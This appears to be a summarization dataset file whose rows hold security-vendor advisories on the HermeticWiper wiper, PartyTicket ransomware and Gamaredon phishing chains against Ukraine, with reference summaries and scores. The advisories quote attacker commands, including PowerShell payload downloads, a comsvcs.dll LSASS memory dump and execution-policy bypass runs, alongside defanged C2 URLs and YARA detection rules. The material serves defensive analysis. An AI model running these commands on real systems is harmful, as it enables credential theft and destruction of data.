operations provide us with further IOC";en;{'r': 0.1797752808988764, 'p': 0.96, 'f': 0.3028391140622357};{'r': 0.14156835530881332, 'p': 0.918918918918919, 'f': 0.24533974513091522};{'r': 0.1797752808988764, 'p': 0.96, 'f': 0.3028391140622357}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/ukraine-wiper-malware-russia;Ukraine: Disk-wiping Attacks Precede Russian Invasion;"UPDATE February 24, 2022, 13:42: This blog has been updated with details about ransomware being used as a possible decoy during some wiper attacks.UPDATE February 25, 2022, 17:00: This blog has been updated with details on how a known Microsoft SQL Server vulnerability (CVE-2021-1636) was exploited in at least one attack.A new form of disk-wiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division of Broadcom Software, has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors.Trojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32-bit and 64-bit driver files which are compressed by the Lempel-Ziv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiperOnce run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities.Attack chainInitial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to potentially related malicious activity beginning as early as November 2021. However, we are continuing to review and verify findings.In the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed by credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23.An organization in Lithuania was compromised from at least November 12, 2021, onwards. It appears the attackers may have leveraged a Tomcat exploit in order to execute a PowerShell command. The decoded PowerShell was used to download a JPEG file from an internal server, on the victim's network.cmd.exe /Q /c powershell -c ""(New-Object System.Net.WebClient).DownloadFile('hxxp://192.168.3.13/email.jpeg','CSIDL_SYSTEM_DRIVE\temp\sys.tmp1')"" 1> \\127.0.0.1\ADMIN$\__1636727589.6007507 2>&1A minute later, the attackers created a scheduled task to execute a suspicious 'postgresql.exe' file, weekly on a Wednesday, specifically at 11:05 local-time. The attackers then ran this scheduled task to execute the task.cmd.exe /Q /c move CSIDL_SYSTEM_DRIVE\temp\sys.tmp1 CSIDL_WINDOWS\policydefinitions\postgresql.exe 1> \\127.0.0.1\ADMIN$\__1636727589.6007507 2>&1schtasks /run /tn ""\Microsoft\Windows\termsrv\licensing\TlsAccess""Nine minutes later, the attackers modified the scheduled task to execute the same postgres.exe file at 09:30 local-time instead.Beginning on February 22, Symantec observed the file 'postgresql.exe' being executed and used to perform the following:Execute certutil to check connectivity to trustsecpro[.]com and whatismyip[.]comExecute a PowerShell command to download another JPEG file from a compromised web server - confluence[.]novus[.]uaFollowing this activity, PowerShell was used to dump credentials from the compromised machine:cmd.exe /Q /c powershell -c ""rundll32 C:\windows\system32\comsvcs.dll MiniDump 600 C:\asm\appdata\local\microsoft\windows\winupd.log full"" 1> \\127.0.0.1\ADMIN$\__1638457529.1247072 2>&1Later, following the above activity, several unknown PowerShell scripts were executed.powershell -v 2 -exec bypass -File text.ps1powershell -exec bypass gp.ps1powershell -exec bypass -File link.ps1Five minutes later, the wiper (Trojan.KillDisk) was deployed.SQL Server exploitThe attackers appear to have used an exploit of a known vulnerability in Microsoft SQL Server (CVE-2021-1636) in order to compromise at least one of the targeted organisations. In an attack against an organization in Ukraine, the following process lineage was used to execute the ""whoami"" command on November 11 2021:CSIDL_SYSTEM_DRIVE\program files\microsoft sql server\mssql12.mssqlserver\mssql\binn\sqlservr.exe,CSIDL_SYSTEM\services.exe,CSIDL_SYSTEM\wininit.exeThe next day, the same process lineage was responsible for executing the following PowerShell command:(New-Object System.Net.WebClient).DownloadFile('hxxp://[INTERNAL_HOST]/label.ico','C:\temp\sys.tmp1')The organization was running an unpatched version of Microsoft SQL Server.Ransomware decoyIn several attacks Symantec has investigated to date, ransomware was also deployed against affected organizations at the same time as the wiper. As with the wiper, scheduled tasks were used to deploy the ransomware. File names used by the ransomware included client.exe, cdir.exe, cname.exe, connh.exe, and intpub.exe. It appears likely that the ransomware was used as a decoy or distraction from the wiper attacks. This has some similarities to the earlier WhisperGate wiper attacks against Ukraine, where the wiper was disguised as ransomware.";A new form of diskwiping malware (Trojan.Killdisk) was used to attack organizations in Ukraine shortly before the launch of a Russian invasion this morning (February 24). Symantec, a division of Broadcom Software, has also found evidence of wiper attacks against machines in Lithuania. Sectors targeted included organizations in the financial, defense, aviation, and IT services sectors. Trojan.Killdisk comes in the form of an executable file, which is signed by a certificate issued to Hermetica Digital Ltd. It contains 32bit and 64bit driver files which are compressed by the LempelZiv algorithm stored in their resource section. The driver files are signed by a certificate issued to EaseUS Partition Master. The malware will drop the corresponding file according to the operating system (OS) version of the infected system. Driver file names are generated using the Process ID of the wiper. Once run, the wiper will damage the Master Boot Record (MBR) of the infected computer, rendering it inoperable. The wiper does not appear to have any additional functionality beyond its destructive capabilities. Attack chain Initial indications suggest that the attacks may have been in preparation for some time. Temporal evidence points to potentially related malicious activity beginning as early as November 2021. However, we are continuing to review and verify findings. In the case of an attack against one organization in Ukraine, the attackers appear to have gained access to the network on December 23, 2021, via malicious SMB activity against a Microsoft Exchange Server. This was immediately followed by credential theft. A web shell was also installed on January 16, before the wiper was deployed on February 23. An organization in;en;{'r': 0.46380697050938335, 'p': 0.9611111111111111, 'f': 0.6256781149580294};{'r': 0.3832528180354267, 'p': 0.9482071713147411, 'f': 0.5458715555332306};{'r': 0.46380697050938335, 'p': 0.9611111111111111, 'f': 0.6256781149580294}
https://securityintelligence.com/posts/new-destructive-malware-cyber-attacks-ukraine/;IBM Security X-Force Research Advisory: New Destructive Malware Used In Cyber Attacks on Ukraine;"This post was written with contributions from IBM Security X-Force's Anne Jobmann, Claire Zaboeva and Richard Emerson.February 25, 2022 UpdateOn February 24 2022, Symantec Enterprise reported a ransomware dubbed as PartyTicket was deployed alongside the HermeticWiper malware. IBM Security X-Force obtained a sample of the PartyTicket ransomware and has provided technical analysis, indicators of compromise, and detections within the PartyTicket section of this blog.On February 23, 2022, open-source intelligence sources began reporting detections of a wiper malware -- a destructive family of malware designed to permanently destroy data from the target -- executing on systems belonging to Ukrainian organizations. IBM Security X-Force obtained a sample of the wiper named HermeticWiper. It uses a benign partition manager driver (a copy of empntdrv.sys) to perform its wiping capabilities corrupting all available physical drives' Master Boot Record (MBR), partition, and file system (FAT or NTFS).This is not the first wiper malware targeting Ukrainian organizations X-Force has analyzed. In January 2022, X-Force analyzed the WhisperGate malware and did not identify any code overlaps between WhisperGate and HermeticWiper.This blog post will detail IBM Security X-Force's insights into the HermeticWiper malware, technical analysis of the sample, and indicators of compromise (IoC) to help organizations protect themselves from this malware.Why This Is ImportantIn January 2022, X-Force analyzed the WhisperGate malware. HermeticWIper is the second newly seen destructive malware family observed in the past two months targeting organizations in Ukraine, and reportedly other countries in Eastern Europe. No code overlaps were identified between WhisperGate and HermeticWiper.The pace at which these new, destructive malware families are being deployed and discovered is unprecedented, and further highlights the need for organizations to have an active and informed defense strategy that expands beyond signature-based defenses.As the conflict in the region continues to evolve and given the destructive capabilities of both WhisperGate and HermeticWiper, IBM Security X-Force recommends critical infrastructure organizations within the targeted region fortify defenses. Those organizations should focus on preparation for potential attacks that can destroy or encrypt data or otherwise significantly impact operations.It is of X-Force's opinion that destructive cyber attacks will likely continue to be leveraged against civilian targets in support of hybrid operations. In addition, X-Force believes it is likely cyber attacks will continue to escalate and expand in parallel with the scope of the ongoing conflict. It should be noted the increasing number of destructive capabilities focused against private industry and entities associated with the Ukraine and its perceived allies, will likely alter the cyber security environment by creating an elevated threat to regional commerce.Analysis DetailsThis section contains the results of the analysis performed for the submitted samples. Typical analysis includes both behavioral and static analysis.Behavioral analysis describes the malware behavior observed on a system during execution. Behavioral analysis typically includes actions performed on the system such as files dropped, persistence, details surrounding process execution and any C2 communications. It should be noted that behavioral analysis may not capture all notable malware behavior as certain functions may only be performed by the malware under specific conditions.Static analysis is a deeper dive into the technical analysis of the malware. Static analysis typically includes further details about the functionality, obfuscation or packing in the sample, encryption used by the malware, configuration information or other notable technical detail.Behavioral AnalysisUpon execution, HermeticWiper immediately adjusts its process token privileges and enables SeBackupPrivilege. This gives the malware read access control to any file, regardless of whatever is specified in access control list (ACL).It then checks for the system's OS version to know which version copy of a benign partition management driver (EaseUS Partition Manager: epmntdrv.sys) it will use. The driver is initially Microsoft compressed (SZDD compression) and embedded in its resource named RCDATA.For Windows XP:x86 - it uses DRV_XP_X86x64 - it uses DRV_XPX64For Windows 7 and up:x86 - it uses DRV_X86x64 - it uses DRV_X64After verifying what version it will use, the SZDD compressed benign partition management driver is then dropped in the following directory as:%WINDIR%\system32\driver\<random_2chars>drExample: C:\Windows\system32\Drivers\vfdrIt then proceeds to decompress it and adds "".sys"" as file extension.Example: C:\Windows\system32\Drivers\vfdr.sysIt then proceeds to adjust its process token privileges again to enable SeLoadDriverPrivilege. This token enables the process of HermeticWiper have the ability to load and unload device drivers.Next, it disables crash dumps by modifying the following registry key:HKLM\SYSTEM\CurrentControlSet\Control\CrashControlCrashDumpEnabled = 0Note that crash dumps are memory dumps that contains information why the system stops unexpectedly. With this option disabled, the system will be prevented to create any dumps, thus successfully covering its tracks.It also disables Volume Shadow Service (vss) if enabled, and disables ShowCompColor and ShowInfoTip in all HKEY_USERS registry:HKEY_USERS\<ID>\Software\Microsoft\Windows\CurrentVersion\Explorer\AdvancedShowCompColor = 0ShowInfoTip = 0ShowCompColor option displays compressed and encrypted NTFS files in color while ShowInfoTip shows pop-up descriptions for folder and desktop items.HermeticWiper then proceeds to add and load the created driver as a service using Windows APIs such as OpenSCManagerW(), OpenServiceW(), CreateServiceW() and StartServiceW().Example:This creates a service entry in the registry:HKLM\SYSTEM\CurrentControlSet\services\<random_2chars>drOnce the benign driver service is started and loaded in the system, it then proceeds to cover its tracks once again by deleting the created driver in %WINDIR%\system32\drivers and deleting the created service in the registry.HermeticWiper enumerates a range of up to 100 Physical Drives by looping 0-100. It uses the benign partition manager, now loaded in the system, to corrupt all Master Boot Record (MBR) for every Physical Drive present in the system.But it doesn't stop there, it also corrupts all the available partition even supporting both FAT and NTFS file system. For NTFS, it also corrupts the Master File Table (MFT) which holds all information about a file to ensure that data will be unrecoverable.Once all disks are corrupted, the system should result to a crash, but just in case, HermeticWiper also created a fail-safe sleeping thread that triggers a system shutdown to force restart the target system.Static AnalysisAnalysis of the wiper sample revealed it was signed with a digital certificate issued to an organization named 'Hermetica Digital Ltd' and was created April 15, 2021. A digital certificate is a file or cryptographic signature that proves the authenticity of an item such as a file, server, or user.HermeticWiper contains the following digital certificate:Indicators of Compromise (IOCs)HermeticwiperFILE SYSTEM:%WINDIR%\system32\driver\<random_2chars>drREGISTRY:HKLM\SYSTEM\CurrentControlSet\Control\CrashControlCrashDumpEnabled = 0HKEY_USERS\<ID>\Software\Microsoft\Windows\CurrentVersion\Explorer\AdvancedShowCompColor = 0ShowInfoTip = 0HKLM\SYSTEM\CurrentControlSet\services\<random_2chars>drSERVICE:service name: <random_2chars>drHermatic Malware SamplesDetectionIBM Security X-Force has developed the following Yara signature to detect additional instances of the HermeticWiper.import ""pe""rule XFTI_HermeticWiper : HermeticWiper{meta:author = ""IBM X-Force Threat Intelligence Malware Team""description = ""Detects the wiper targeting Ukraine.""threat_type = ""Malware""rule_category = ""Malware Family""usage = ""Hunting and Identification""ticket = ""IRIS-12790""hash = ""1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591""yara_version = ""4.0.2""date_created = ""24 Feb 22""date_updated = """"reference = """"xfti_reference = """"strings:$s1 = ""\\\\.\\EPMNTDRV\\%u"" wide fullword$s2 = ""C:\\Windows\\SYSVOL"" wide fullword$s3 = ""DRV_X64"" wide fullword$s4 = ""DRV_X86"" wide fullword$s5 = ""DRV_XP_X64"" wide fullword$s6 = ""DRV_XP_X86"" wide fullwordcondition:uint16(0) == 0x5A4D and 4 of them andpe.imports(""lz32.dll"", ""LZOpenFileW"") andpe.imports(""kernel32.dll"", ""FindResourceW"") andpe.imports(""advapi32.dll"", ""CryptAcquireContextW"")}PartyTicket AnalysisThe ransomware sample dubbed as PartyTicket is a Golang compiled ransomware which is believed to be distributed alongside the HermeticWiper malware that targets Ukraine organizations.PartyTicket ransomware doesn't include any escalation of privileges and will execute within the context of the current user. This means that if it was executed with a non-privileged account, folders and files requiring higher privileges will not be encrypted.PartyTicket adds "".[[email protected]].encryptedJB"" as file extension to all files it encrypts. It uses both RSA and AES to encrypt targeted files.Initial static analysis of the ransomware reveals ""Biden"" and ""Whitehouse"" referenced within the code.Upon execution, PartyTicket ransomware builds a list of files to encrypt by checking for all available drives from A: to Z: and traversing all directories except for those containing ""Windows"" and ""Program Files"".While traversing the directory structure, the ransomware enumerates a target list of files containing the following extensions:.acl, .avi, .bat, .bmp, .cab, .cfg, .chm, .cmd, .com, .crt, .css, .dat, .dip, .dll, .doc, .dot, .exe, .gif, .htm, .ico, .iso, .jpg, .mp3, .msi, .odt, .one, .ova, .pdf, .png, .ppt, .pub, .rar, .rtf, .sfx, .sql, .txt, .url, .vdi, .vsd, .wma, .wmv, .wtv, .xls, .xml, .xps, .zip, .docx, .epub, .html, .jpeg, .pptx, .xlsx, .pgsql, .contact, incNote that .exe is included in the target file to encrypt, indicating that the ransomware will encrypt itself afterwards.Once the target list is created, the ransomware will create a copy of itself with a universally unique identifier (UUID) name for every file within the target list. The copies are executed with a thirty-second timeout as children of the original PartyTicket process, each responsible for encrypting a file within the target file list.Example PartyTicket child process execution lifecycle:C:\Windows\system32\cmd.exe cmd /c copy <PartyTicket.exe> b6771851-a968-11eb-9f9f-000c29fc4fde.exeb6771851-a968-11eb-9f9f-000c29fc4fde.exe.exe <target_file_to_encrypt>timeout /t 30 && C:\Windows\system32\cmd.exe /C del <UUID>.exePartyTicket Indicators of Compromise (IOCs)FILE SYSTEM:%DESKTOP%\read_me.html<encrypted_files>.[[email protected]].encryptedJBPartyTicket DetectionIBM Security X-Force has developed the following Yara signature to help identify instances of the PartyTicket ransomware.rule XFTI_PartyTicket : PartyTicket{meta:author = ""IBM Security X-Force ""description = ""Detects the PartyTicket ransomware deployed alongside the HermeticWiper malware. The rule includes notable strings and function names.""threat_type = ""Malware""rule_category = ""Malware Family""usage = ""Hunting and Identification""hash = ""4dc13bb83a16d4ff9865a51b3e4d24112327c526c1392e14d56f20d6f4eaf382""yara_version = ""4.0.2""date_created = ""25 Feb 22""strings:$main_func1 = ""pr1me""$main_func2 = ""dtFie""$main_func3 = ""getBoo""$main_func4 = ""selfElect""$main_func5 = ""highWay60""$main_func6 = ""voteFore403""$main_func7 = ""subscribeNewPartyMember""$proj_path = ""/403forBiden/""$file_ext = "".encryptedJB""condition:uint16(0) == 0x5A4D and 7 of them}ResponseAt this time, X-Force recommends organizations implement detections for the file system, registry, and Windows service indicators listed in this report as well as leveraging the provided Yara rule to scan files. Additionally, global businesses should seek to establish sound insight into their respective networks, supply chains, third parties, and partnerships that are based in, or serve in-region institutions. It is also advised that organizations open lines of communications between relevant information-sharing entities to ensure the receipt and exchange of actionable indicators.In addition to response measures associated with the indicators of compromise, X-Force recommends organizations consider the following proactive measures:Block high-risk protocols on all B2B VPNsImplement netflow monitoring at all egress pointsHave contingency plans in place to disconnect B2B VPNs, particularly those that are high-riskPrevent loading of unknown driver filesIf you have questions and want a deeper discussion about the malware and prevention techniques, you can schedule a briefing here. Get the latest updates as more information develops on the IBM Security X-Force Exchange and the IBM PSIRT blog.If you are experiencing cybersecurity issues or an incident, contact X-Force to help.US hotline 1-888-241-9812Global hotline (+001) 312-212-8034Christopher Del Fierro X-Force IRIS Malware Reverse Engineer John Dwyer Head of Research, IBM Security X-Force";XForce recommends organizations implement detections for the file system, registry, and Windows service indicators listed in this report as well as leveraging the provided Yara rule to scan files. Additionally, global businesses should seek to establish sound insight into their respective networks, supply chains, third parties, and partnerships that are based in, or serve inregion institutions. It is also advised that organizations open lines of communications between relevant informationsharing entities to ensure the receipt and exchange of actionable indicators.;en;{'r': 0.07869249394673124, 'p': 0.9558823529411765, 'f': 0.14541386884054275};{'r': 0.048153034300791556, 'p': 0.9358974358974359, 'f': 0.09159347460246943};{'r': 0.07869249394673124, 'p': 0.9558823529411765, 'f': 0.14541386884054275}
https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-fscc/a82e9105-2405-4e37-b2c3-28c773902d85;[MS-FSCC]: NTFS Attribute Types;"Table of contents5.2 NTFS Attribute TypesArticle10/30/2020 FeedbackIn this articleOn a NTFS volume, each unit of information associated with a file including its name, its owner, its timestamp, its contents, and so on, is implemented as a file attribute. A file's data is an attribute, the ""Data Attribute"" known as $DATA. A number of attributes exist on a NTFS volume. The attribute names used by NTFS are listed in the table below.Attribute Name Description $ATTRIBUTE_LIST Lists the location of all attribute records that do not fit in the MFT record $BITMAP Attribute for Bitmaps $DATA Contains the default file data $EA Extended the attribute index $EA_INFORMATION Extended attribute information $FILE_NAME File name $INDEX_ALLOCATION The type name for a Directory Stream. A string for the attribute code for index allocation $INDEX_ROOT Used to support folders and other indexes $LOGGED_UTILITY_STREAM Use by the encrypting file system $OBJECT_ID Unique GUID for every MFT record $PROPERTY_SET Obsolete $REPARSE_POINT Used for volume mount points $SECURITY_DESCRIPTOR Security descriptor stores ACL and SIDs $STANDARD_INFORMATION Standard information, such as file times and quota data $SYMBOLIC_LINK Obsolete $TXF_DATA Transactional NTFS data $VOLUME_INFORMATION Version and state of the volume $VOLUME_NAME Name of the volume $VOLUME_VERSION Obsolete. Volume versionA comprehensive discussion and explanation about attributes is available in [WININTERNALS] Chapter 12 and [MSFT-NTFSWorks].";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://learn.microsoft.com/en-us/windows/win32/devnotes/attribute-list-entry;ATTRIBUTE_LIST_ENTRY structure - Win32 apps;Table of contentsATTRIBUTE_LIST_ENTRY structureArticle01/06/20215 contributors FeedbackIn this article[This structure is valid only for version 3 of NTFS volumes, it may be altered in future versions.]Represents an entry in the attribute list.Syntaxtypedef struct _ATTRIBUTE_LIST_ENTRY { ATTRIBUTE_TYPE_CODE AttributeTypeCode, USHORT RecordLength, UCHAR AttributeNameLength, UCHAR AttributeNameOffset, VCN LowestVcn, MFT_SEGMENT_REFERENCE SegmentReference, USHORT Reserved, WCHAR AttributeName[1], } ATTRIBUTE_LIST_ENTRY, *PATTRIBUTE_LIST_ENTRY,MembersAttributeTypeCode The attribute type code. Value Meaning $STANDARD_INFORMATION 0x10 File attributes (such as read-only and archive), time stamps (such as file creation and last modified), and the hard link count.$ATTRIBUTE_LIST 0x20 A list of attributes that make up the file and the file reference of the MFT file record in which each attribute is located.$FILE_NAME 0x30 The name of the file, in Unicode characters.$OBJECT_ID 0x40 An 16-byte object identifier assigned by the link-tracking service.$VOLUME_NAME 0x60 The volume label. Present in the $Volume file.$VOLUME_INFORMATION 0x70 The volume information. Present in the $Volume file.$DATA 0x80 The contents of the file.$INDEX_ROOT 0x90 Used to implement filename allocation for large directories.$INDEX_ALLOCATION 0xA0 Used to implement filename allocation for large directories.$BITMAP 0xB0 A bitmap index for a large directory.$REPARSE_POINT 0xC0 The reparse point data.RecordLength The size of this structure, plus the optional name buffer, in bytes. AttributeNameLength The size of the optional attribute name, in characters. If a name exists, this value is nonzero and the structure is followed immediately by a Unicode string of the specified number of characters. AttributeNameOffset Reserved. LowestVcn The lowest virtual cluster number (VCN) for this attribute. This member is zero unless the attribute requires multiple file record segments and unless this entry is a reference to a segment other than the first one. In this case, this value is the lowest VCN that is described by the referenced segment. SegmentReference The master file table (MFT) segment in which the attribute resides. See MFT_SEGMENT_REFERENCE. Reserved Reserved. AttributeName The start of the optional attribute name.RemarksThe attributes list is an ordered list of quadword-aligned ATTRIBUTE_LIST_ENTRY structures. This list is ordered first by the attribute type code and then by the attribute name (if present). No two attributes can have the same type code, name, and lowest VCN. Therefore, there can be at most one attribute for each type code without a name.This structure definition is valid only for major version 3 and minor version 0 or 1, as reported by FSCTL_GET_NTFS_VOLUME_DATA.Note that there is no associated header file for this structure.See also;NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
https://www.zscaler.com/blogs/security-research/hermeticwiper-resurgence-targeted-attacks-ukraine;HermeticWiper & resurgence of targeted attacks on Ukraine;"SummarySince Jan 2022, ThreatLabz has observed a resurgence in targeted attack activity against Ukraine. We identified two attack-chains in the timeframe - Jan to Feb 2022, which we attribute to the same threat actor with a moderate confidence level. It is important to note that we are not attributing the attacks to any nation-state backed threat actors at this point, since we don't have full visibility into the final payloads and the motives of the attack. The C2 infrastructure re-use points to Gamaredon APT threat actor, however more visibility is needed for proper attribution.The first attack-chain was blogged by the CERT team of Ukraine on 1st Feb 2022 here . It involved spear phishing emails sent to the ""State Administration of Seaports of Ukraine"". The samples corresponding to the next-stage document template and the VBScript payload were not available in public domain. We were able to identify the document template and VBScript payload, and we aim to share the technical analysis in this blog.On 11th Feb 2022, we identified a sample uploaded to VirusTotal from Ukraine which resulted in our discovery of a previously undocumented attack-chain. We describe the technical details of this second attack-chain in the blog. By pivoting on the metadata of the files, we were able to discover 7 unique samples and the origins of campaign tracing back to Nov 2020.On 23rd Feb 2022, there were reports of a new sophisticated wiper malware hitting several organizations in the Ukraine with an objective of destroying data and causing business disruption. Threatlabz team analyzed the malware payload involved and uncovered several new tactics used in these attacks. A ransomware decoy known as PartyTicket was also observed being deployed during these attacks.In this blog, we will look at the technical details of these recent attacks targeting commercial and public entities in Ukraine.1. HermeticWiper DoS Attack - Technical AnalysisHermeticWiper is a sophisticated malware family that is designed to destroy data and render a system inoperableThe wiper is multi-threaded to maximize speed and utilizes a kernel driver for low-level disk accessThese driver files appear to be part an outdated version of the EaseUS Partition Master application developed by CHENGDU YIWO Tech DevelopmentThe HermeticWiper malware sample with SHA256 1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 was compiled at 2022-02-23 09:48:53 UTC and was digitally signed with a valid certificate that was issued to Hermetica Digital Ltd. as shown in Figure 1.Figure 1: HermeticWiper's digital signatureThe malware supports two command-line arguments that control the maximum duration to spend destroying data before forcing the system to reboot. After parsing the command-line, HermeticWiper calls OpenProcessToken() with the access mask TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY. If the wiper does not have sufficient privileges, it will terminate without performing any malicious actions. Otherwise HermeticWiper will attempt to grant itself the privileges SeShutdownPrivilege and SeBackupPrivilege and install a Windows kernel driver. The driver is embedded in the malware's resource section, which contains the names and SHA256 hashes shown in Table 1. These files are digitally signed drivers that are used to interact with disks.Driver filename Compressed SHA256 Decompressed SHA256 DRV_X64 e5f3ef69a534260e899a36cec459440dc572388defd8f1d98760d31c700f42d5 96b77284744f8761c4f2558388e0aee2140618b484ff53fa8b222b340d2a9c84 DRV_X86 b01e0c6ac0b8bcde145ab7b68cf246deea9402fa7ea3aede7105f7051fe240c1 8c614cf476f871274aa06153224e8f7354bf5e23e6853358591bf35a381fb75b DRV_XP_X64 b6f2e008967c5527337448d768f2332d14b92de22a1279fd4d91000bb3d4a0fd 23ef301ddba39bb00f0819d2061c9c14d17dc30f780a945920a51bc3ba0198a4 DRV_XP_X86 fd7eacc2f87aceac865b0aa97a50503d44b799f27737e009f91f3c281233c17d 2c7732da3dcfc82f60f063f2ec9fa09f9d38d5cfbe80c850ded44de43bdb666dTable 1. Driver files embedded in HermeticWiperThe specific driver that is extracted depends on whether the Windows operating system version is 32-bit or 64-bit and Windows XP or newer. The functions that are used to determine the Windows operating system version are VerSetConditionMask and VerifyVersionInfoW. These functions are rarely seen in comparison to the standard GetVersion functions to identify the Windows version.After these resources are extracted from the binary, the Windows LZ extraction library functions are used to decompress them. The Windows command-line utility expand.exe can also be used to manually decompress the drivers as shown in Figure 2.Figure 2: Manual decompression of the HermeticWiper drivers using the Windows expand utilityThe certificate for these signed drivers is registered to CHENGDU YIWO Tech Development Co., Ltd., but expired on September 11, 2014 as shown in Figure 3.Figure 3: Expired certificate used to sign the HermeticWiper driversThese driver files appear to be part of the EaseUS Partition Master application developed by CHENGDU YIWO Tech Development.The driver file is written to the Windows drivers directory with a filename that includes two alphabetic characters that are pseudorandomly chosen using the current process ID concatenated with the string ""dr"" and appended with a .sys extension (e.g., lxdr.sys). Hermetic Wiper will then elevate its privileges to SeLoadDriverPrivilege and load the driver and start it as a service. The malware disables the vss (Volume Shadow Copy) service used for backing up and restoring data and sets the CrashDumpEnabled registry value to zero in the registry key HKLM\SYSTEM\CurrentControlSet\Control\CrashControl to disable crash dumps. This ensures that if the malware crashes, Windows will not produce a crash dump file that can be used to identify the cause. The registry values ShowCompColor and ShowInfoTip are also set to zero (i.e. disabled) under the registry key HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced to suppress pop-ups and other indicators of data destruction.The driver registers itself as a device named EPMNTDRV to expose itself to the userland component of HermeticWiper. The malware enumerates physical disks 0-100 and destroys the Master Boot Record (MBR) on every physical disk by overwriting the first 512 bytes with random data. The malware then parses the file system to determine whether the partition is NTFS or FAT. If the file system is the former, it will overwrite the Master File Table (MFT) that stores information about every file on the system. Hermetic also targets files that are located in the directories:C:\System Volume InformationC:\Windows\SYSVOLC:\Documents and SettingsC:\Windows\System32\winevt\LogsAfter the data destruction occurs, a forced reboot will occur. As a result, the boot loader will not be able to load the operating system as shown in Figure 4.Figure 4. Result after HermeticWiper erases the Master Boot Record and forces a system reboot2. Targeted AttacksTimeframe - Nov 2021 onwardsDuring our analysis, we found a C2 infrastructure overlap between the two targeted attack chains seen below in Figure 4 and 5.Figure 4: Targeted attack chain 1Figure 5: Targeted attack chain 2Technical analysisAttack chain 1The attack chain 1 infection starts with an email which has a malicious RAR archive attachment. The victim downloads and extracts the RAR archive contents which contains a malicious document file that is themed using the ongoing geo-political conflict between Russia and Ukraine.[+] Stage 1: DocumentThe document on execution simply downloads a macro-based template from the specified remote location. Figure 6 below shows the template reference present inside one of the documents.Figure 6: Relationship referring the macro-based remote template[+] Stage 2: Macro template (714f8341bd1c4bc1fc38a5407c430a1a)The macro code inside the template is obfuscated by adding a lot of junk code. This not only inflates the size of macro code but also hinders the code analysis. The main operation it performs is to drop and execute a VBScript.The VBScript is Base64-encoded inside the VBA macro as shown in Figure X below.Figure 7: Base64-encoded VBScript inside the VBA macro[+] Stage 3: VBScriptAs per OSINT, this stage-3 VBScript which is dropped by the stage-2 macro is called GammaLoad. The VBScript code is obfuscated similar to the macro code. On execution it performs the following operations:1. Collects user and system information for exfiltration2. Grabs the IP address associated with the configured C2 domain using WMIWMI query format: SELECT * FROM Win32_PingStatus WHERE Address={configured_c2_domain}3. Sends a network request to download the next stage payload using the IP address obtained from step 2 and also exfiltrate the information collected from step 1 using the UserAgent fieldUserAgent Format: {hardcoded_useragent_string}::%USERPROFILE%_%SYSTEMDRIVE%.SerialNumber::\.{static_string}\.4. Drops and executes the downloaded payloadNote: At the time of analysis we didn't get this next stage payload but based on past analysis the threat actor is known to drop some remote desktop application like UltraVNCAttack Chain 2We identified another attack-chain used by the same threat actor which is not documented anywhere in the public domain, to the best of our knowledge. Based on our research, this campaign has been active since as early as November 2020 and only 7 unique samples have been identified till date related to this campaign. The most recent instance was observed on 11th Feb 2022 and based on the filename, we believe that it was distributed on 8th Feb 2022 to the targeted victim(s).This low-volume campaign involves RAR archive files distributed through spear phishing emails. These RAR archive files contain a malicious Windows shortcut file (LNK) which downloads the MSI payload from the attacker-controlled server and executes it on the endpoint using MSIEXEC.This results in the packaged NSIS binary to be dropped on the system and it starts the infection-chain.Components of the NSIS binary will be unpacked in the directory: %temp%\<random_name>.tmp\ during the course of its execution.All the extracted components are shown below.Figure 8: components of the NSIS binaryIt loads the DLL from the above directory.MD5 hash of the DLL: 74ce360565fa23d9730fe0c5227c22e0Filename of the DLL: ypagjgfyy.dllThe NSIS script which controls the execution of the NSIS installer can be used to analyze the activity. The relevant code sections from the script are included in the Appendix section.The steps below summarize the activity:Call the export function: ""oqiuqqaxaicm"" in the DLL file - ypagjgfyy.dll and pass it two parameters. The first one is the encrypted string and the second one is the decryption key. The decrypted string is a URL: hxxp://kfctm[.]online/0102adqeczoL2.txt Call the download_quiet function in nsisdl (downloader component of NSIS installer) to fetch the contents of the URL which was decrypted in step 2. The response is saved in the file - $PLUGINSDIR\readme.txt Call the export function: ""cfyhayyyu"" in the DLL file - ypagjgfyy.dll and pass it three parameters. The first parameter is the file created in step 4 and the other 2 parameters are used to decrypt the contents of the readme.txt file. At this point, the code can take 2 paths based on whether the readme.txt file was successfully created or not in step 4. If step 4 was successful, then the decrypted contents of the readme.txt file will be used as a decryption key to decrypt other important strings and continue the malicious activities.At the time of our analysis, since the URL in step 2 did not respond so the readme.txt file was not created. As a result, the code execution continued to call the export function: ""euuxijbaha"" in the DLL - ypagjgfyy.dll to decrypt the contents of the DAT file - gofygsg.dat packaged inside the NSIS installer. The resulting decrypted content is a DOCX file which is displayed to the victim with MS Office Word application.Infrastructure overlap and re-useDuring our analysis of the targeted attacks, we found that one of the C2 domain - ""download.logins[.]online"" which was used to host the MSI payload as part of attack-chain 2 was previously attributed to the Gamaredon APT threat actor by Anomali labs . At that time, it was used to host a macro-based template document which overlaps with the attack-chain 1, as we described in this blog.Zscaler coverageWe have ensured coverage for the payloads seen in these 